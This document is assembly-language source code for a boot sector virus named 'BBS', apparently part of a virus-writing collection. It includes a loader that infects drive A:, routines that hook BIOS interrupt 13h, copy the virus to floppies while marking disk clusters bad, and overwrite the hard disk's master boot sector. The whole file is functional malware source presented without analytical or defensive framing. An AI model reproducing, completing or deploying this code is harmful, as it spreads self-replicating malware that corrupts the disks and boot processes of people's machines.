;The BBS Virus is a boot sector virus which remains resident in memory
;after boot so it can infect disks.

.model  tiny                    ;change to "small" for MASM versions that dont
.code                           ;understand "tiny"

        ORG     100H

;This function acts as the loader for the virus. It infects the disk in a:
START:
        xor     ax,ax
        mov     es,ax
        mov     bx,4CH
        mov     ax,es:[bx]
        mov     WORD PTR [OLD_13H],ax           ;set up OLD_13H
        mov     ax,es:[bx+2]
        mov     WORD PTR [OLD_13H+2],ax
        push    ds
        pop     es
        mov     BYTE PTR ds:[CURR_DISK],0       ;infect drive #0 (a:)
        mov     dl,0                            ;set up dl for CHECK_DISK
        call    CHECK_DISK                      ;is floppy already infected?
        jz      EXIT_BAD                        ;yes, just exit
        call    INIT_FAT_MANAGER                ;initialize FAT management routines
        call    INFECT_FLOPPY                   ;no, go infect the diskette
EXIT_NOW:
        mov     ah,9                            ;say infection ok
        mov     dx,OFFSET OK_MSG
        int     21H
        mov     ax,4C00H                        ;exit to DOS
        int     21H

EXIT_BAD:
        mov     ah,9                            ;say there was a problem
        mov     dx,OFFSET ERR_MSG
        int     21H
        mov     ax,4C01H                        ;exit with error code
        int     21H

OK_MSG  DB      'Infection complete!$'
ERR_MSG DB      'Infection process could not be completed!$'

;*******************************************************************************
;* BIOS DATA AREA                                                              *
;*******************************************************************************

        ORG     413H

MEMSIZE DW      640                     ;size of memory installed, in KB

;*******************************************************************************
;* VIRUS CODE STARTS HERE                                                      *
;*******************************************************************************

VIR_SIZE        EQU     2       ;size of virus, in sectors

        ORG     7C00H - 512*VIR_SIZE - 512

BBS:                            ;A label for the beginning of the virus

INCLUDE INT13H.ASM              ;include interrupt 13H handler main routine

;*******************************************************************************
;This routine checks the status of the diskette motor flag for the drive in
;dl. If the motor is on, it returns with nz, else it returns with z.
CHECK_MOTOR:
        push    bx
        push    dx
        push    es
        xor     bx,bx
        mov     es,bx                           ;es=0
        mov     bx,43FH                         ;motor status at 0:43FH
        mov     bl,es:[bx]
        inc     dl
        and     bl,dl                           ;is motor on? ret with flag set
        pop     es
        pop     dx
        pop     bx
        ret

;*******************************************************************************
;See if disk dl is infected already. If so, return with Z set. This
;does not assume that registers have been saved, and saves/restores everything
;but the flags.

CHECK_DISK:
        push    ax                              ;save everything
        push    bx
        push    cx
        push    dx
        push    si
        push    di
        push    bp
        push    ds
        push    es

        mov     ax,cs
        mov     ds,ax
        mov     es,ax
        mov     bx,OFFSET SCRATCHBUF            ;buffer for the boot sector
        mov     dh,0                            ;head 0
        mov     cx,1                            ;track 0, sector 1
        mov     ax,201H                         ;BIOS read function
        push    ax
        pushf
        call    DWORD PTR cs:[OLD_13H]          ;do double read to
        pop     ax                              ;avoid problems with just
        pushf
        call    DWORD PTR cs:[OLD_13H]          ;changed disk
        jnc     CD1
        xor     al,al                           ;act as if infected
        jmp     SHORT CD2                       ;in the event of an error
CD1:    call    IS_VBS                          ;see if viral boot sec (set z)
CD2:    pop     es                              ;restore everything
        pop     ds                              ;except the z flag
        pop     bp
        pop     di
        pop     si
        pop     dx
        pop     cx
        pop     bx
        pop     ax
        ret


;*******************************************************************************
;This routine puts the virus on the floppy disk. It has no safeguards to prevent infecting
;an already infected disk. That must occur at a higher level.
;On entry, [CURR_DISK] must contain the drive number to act upon.

INCLUDE FATMAN.ASM

INFECT_FLOPPY:
        push    ax
        push    bx
        push    cx
        push    dx
        push    si
        push    di
        push    bp
        push    ds
        push    es
        mov     ax,cs
        mov     ds,ax
        mov     es,ax
        mov     bx,VIR_SIZE+1                   ;number of sectors requested
        call    FIND_FREE                       ;find free space on disk
        jnc     INF1                            ;exit now if no space
IFX:    pop     es
        pop     ds
        pop     bp
        pop     di
        pop     si
        pop     dx
        pop     cx
        pop     bx
        pop     ax
        ret

INF1:   push    cx
        mov     dx,cx                           ;dx=cluster to start marking
        mov     cx,VIR_SIZE+1                   ;sectors requested
        call    MARK_CLUSTERS                   ;mark required clusters bad
        call    UPDATE_FAT_SECTOR               ;and write it to disk

        mov     ax,0201H
        mov     bx,OFFSET SCRATCHBUF
        mov     cx,1
        mov     dh,ch
        mov     dl,[CURR_DISK]
        pushf
        call    DWORD PTR cs:[OLD_13H]          ;read original boot sector

        mov     si,OFFSET SCRATCHBUF + 3        ;BS_DATA in current sector
        mov     di,OFFSET BOOT_START + 3
        mov     cx,59                           ;copy boot sector disk info over
        rep     movsb                           ;to new boot sector
        mov     di,OFFSET END_BS_CODE
        mov     si,di
        sub     si,(OFFSET BOOT_START - OFFSET SCRATCHBUF)
        mov     cx,7E00H                        ;so boot works right on
        sub     cx,di
        rep     movsb                           ;floppies too

        pop     cx
        call    CLUST_TO_ABSOLUTE               ;set cx,dx up with trk, sec, hd info
        xor     dl,dl
        mov     ds:[VIRCX],cx
        mov     ds:[VIRDX],dx

        mov     dl,ds:[CURR_DISK]
        mov     bx,OFFSET BBS
        mov     si,VIR_SIZE+1                   ;read/write VIR_SIZE+1 sectors
INF2:   push    si
        mov     ax,0301H                        ;read/write 1 sector
        pushf
        call    DWORD PTR cs:[OLD_13H]          ;call BIOS to write it
        pop     si
        jc      IFEX                            ;exit if it fails
        add     bx,512                          ;increment read buffer
        inc     cl                              ;get ready to do next sector--inc sector ct
        cmp     cl,BYTE PTR [SECS_PER_TRACK]    ;last sector on track?
        jbe     INF3                            ;no, continue
        mov     cl,1                            ;yes, set sector=1
        inc     dh                              ;try next side
        cmp     dh,2                            ;last side?
        jb      INF3                            ;no, continue
        xor     dh,dh                           ;yes, set side=0
        inc     ch                              ;and increment track count
INF3:   dec     si
        jnz     INF2
        mov     ax,0301H
        mov     bx,OFFSET BOOT_START
        mov     cx,1
        mov     dh,ch
        mov     dl,[CURR_DISK]
        pushf
        call    DWORD PTR cs:[OLD_13H]          ;write viral boot sector into boot sector
IFEX:   jmp     IFX


;*******************************************************************************
;Infect Hard Disk Drive AL with this virus. This involves the following steps:
;A) Read the present boot sector. B) Copy it to Track 0, Head 0, Sector 7.
;C) Copy the disk parameter info into the viral boot sector in memory. D) Copy
;the viral boot sector to Track 0, Head 0, Sector 1. E) Copy the BBS
;routines to Track 0, Head 0, Sector 2, 5 sectors total. The present MBS
;should already be in memory at SCRATCHBUF when this is called!

INFECT_HARD:
        mov     bx,OFFSET BBS                   ;and go write it at
        mov     dx,80H                          ;drive c:, head 0
        mov     ds:[VIRDX],dx                   ;save where virus goes
        mov     cx,0002H                        ;track 0, sector 2
        mov     ds:[VIRCX],cx
        mov     ax,0300H + VIR_SIZE + 1         ;BIOS write
        int     13H                             ;virus + original mbs to disk

        mov     si,OFFSET SCRATCHBUF + 1BEH     ;set up partition table
        mov     di,OFFSET PART
        mov     cx,40H
        rep     movsb

        mov     WORD PTR ds:[BS_SECS_PER_TRACK],64 ;make this big enough to work
        mov     bx,OFFSET BOOT_START
        mov     dx,80H                          ;head 0, drive c:
        mov     cx,1                            ;track 0, sector 1
        mov     ax,301H                         ;write 1 sector
        int     13H

        ret


;*******************************************************************************
;This routine determines if a hard drive C: exists, and returns NZ if it does,
;Z if it does not.
IS_HARD_THERE:
        push    ds
        xor     ax,ax
        mov     ds,ax
        mov     bx,475H                         ;Get hard disk count from bios
        mov     al,[bx]                         ;put it in al
        pop     ds
        or      al,al                           ;return z set/reset
        ret


;*******************************************************************************
;Determine whether the boot sector in SCRATCHBUF is the viral boot sector.
;Returns Z if it is, NZ if not. The first 30 bytes of code, starting at BOOT,
;are checked to see if they are identical. If so, it must be the viral boot
;sector. It is assumed that es and ds are properly set to this segment when
;this is called.

IS_VBS:
        push    si                              ;save these
        push    di
        cld
        mov     di,OFFSET BOOT                  ;set up for a compare
        mov     si,OFFSET SCRATCHBUF + (OFFSET BOOT - OFFSET BOOT_START)

        mov     cx,15
        repz    cmpsw                           ;compare 30 bytes
        pop     di                              ;restore these
        pop     si
        ret                                     ;and return with z properly set


;*******************************************************************************
;* A SCRATCH PAD BUFFER FOR DISK READS AND WRITES                              *
;*******************************************************************************

        ORG     7C00H - 512

SCRATCHBUF:                                     ;buffer for virus disk read/write

INCLUDE BOOT.ASM                                ;include boot sector code

        END     START
